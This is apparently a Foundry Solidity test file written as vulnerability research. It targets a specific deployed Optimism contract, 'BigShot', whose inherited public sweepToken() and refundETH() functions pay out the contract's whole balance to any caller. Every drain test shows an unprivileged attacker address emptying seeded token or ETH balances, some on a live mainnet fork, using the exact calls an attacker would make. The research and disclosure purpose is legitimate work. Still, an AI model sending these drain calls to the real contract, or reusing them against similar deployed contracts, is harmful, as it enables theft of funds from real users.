// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";

/// @title BigShot.sweepToken — Slice-class (T1 destination-trust) drain, Optimism
/// @notice Read-only research. Fork / etch only. No transaction is ever signed or broadcast.
/// Target: 0x274D146c910dCe811805E08fF8F61a1c3A931c4a ("BigShot", Optimism)
///   inherits uniswap v3-periphery PeripheryPayments, whose sweepToken()/unwrapWETH9()/
///   refundETH() are PUBLIC and pay the contract's own balance to a caller-supplied address.
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IBigShot {
    function sweepToken(address token, uint256 amountMinimum, address recipient) external payable;
    function unwrapWETH9(uint256 amountMinimum, address recipient) external payable;
    function refundETH() external payable;
    function owner() external view returns (address);
}

contract BigShotDrainTest is Test {
    address constant BIGSHOT = 0x274D146c910dCe811805E08fF8F61a1c3A931c4a;
    address constant OP_TOKEN = 0x4200000000000000000000000000000000000042; // OP (plain ERC-20)
    address constant WETH9_OP = 0x4200000000000000000000000000000000000006;

    address attacker = makeAddr("attacker");

    function _rpc(string memory name, string memory fb) internal view returns (string memory) {
        string memory v = vm.envOr(name, string(""));
        return bytes(v).length == 0 ? fb : v;
    }

    function _opRpc() internal view returns (string memory) {
        return _rpc("OP_RPC_URL", "https://mainnet.optimism.io");
    }

    /// Pure unit test: etch the exact deployed BigShot runtime code and prove sweepToken()
    /// pays the contract's whole token balance to a caller-supplied recipient.
    /// (No fork needed: sweepToken() is stateless — it only reads token.balanceOf(this).)
    function test_etched_sweepToken_drainsWholeBalance_toCallerSuppliedRecipient() public {
        bytes memory code = vm.parseBytes(vm.readFile("runtime/bigshot.hex"));
        vm.etch(BIGSHOT, code);
        assertEq(BIGSHOT.code.length, 18214, "deployed BigShot runtime size");

        MockERC20 tok = new MockERC20();
        tok.mint(BIGSHOT, 1000e6);
        assertEq(tok.balanceOf(BIGSHOT), 1000e6);

        vm.prank(attacker);
        IBigShot(BIGSHOT).sweepToken(address(tok), 0, attacker);

        assertEq(tok.balanceOf(attacker), 1000e6, "attacker received the whole balance");
        assertEq(tok.balanceOf(BIGSHOT), 0, "BigShot emptied");
    }

    /// Pure unit test: refundETH() sends the contract's ENTIRE native balance to msg.sender.
    function test_etched_refundETH_drainsWholeNativeBalance() public {
        bytes memory code = vm.parseBytes(vm.readFile("runtime/bigshot.hex"));
        vm.etch(BIGSHOT, code);

        vm.deal(BIGSHOT, 5 ether);
        assertEq(BIGSHOT.balance, 5 ether);

        vm.prank(attacker);
        IBigShot(BIGSHOT).refundETH();

        assertEq(attacker.balance, 5 ether, "attacker received the whole ETH balance");
        assertEq(BIGSHOT.balance, 0, "BigShot native emptied");
    }

    /// Optimism fork: the live contract exposes selector 0xdf2ab5bb and holds nothing today.
    function test_live_optimism_selector_present_and_balances_zero() public {
        vm.createSelectFork(_opRpc());
        assertEq(block.chainid, 10, "chainid is Optimism");
        assertGt(BIGSHOT.code.length, 0, "BigShot deployed");

        bytes memory code = BIGSHOT.code;
        assertTrue(_contains(code, hex"df2ab5bb"), "sweepToken(address,uint256,address) selector present");
        assertTrue(_contains(code, hex"49404b7c"), "unwrapWETH9(uint256,address) selector present");
        assertTrue(_contains(code, hex"12210e8a"), "refundETH() selector present");

        assertEq(BIGSHOT.balance, 0, "native balance 0");
        assertEq(IERC20(OP_TOKEN).balanceOf(BIGSHOT), 0, "OP token balance 0");
    }

    /// Optimism fork: seed a token balance into the live contract and drain it from an
    /// unprivileged EOA using the exact calldata an attacker would send.
    function test_live_optimism_fork_sweepToken_drains() public {
        vm.createSelectFork(_opRpc());
        assertEq(block.chainid, 10, "chainid is Optimism");

        deal(OP_TOKEN, BIGSHOT, 1e18);
        assertEq(IERC20(OP_TOKEN).balanceOf(BIGSHOT), 1e18, "seeded");

        vm.prank(attacker);
        IBigShot(BIGSHOT).sweepToken(OP_TOKEN, 0, attacker);

        assertEq(IERC20(OP_TOKEN).balanceOf(attacker), 1e18, "attacker drained the seeded balance");
        assertEq(IERC20(OP_TOKEN).balanceOf(BIGSHOT), 0, "BigShot emptied");
    }

    function _contains(bytes memory haystack, bytes memory needle) internal pure returns (bool) {
        if (needle.length > haystack.length) return false;
        for (uint256 i = 0; i <= haystack.length - needle.length; i++) {
            bool ok = true;
            for (uint256 j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) {
                    ok = false;
                    break;
                }
            }
            if (ok) return true;
        }
        return false;
    }
}
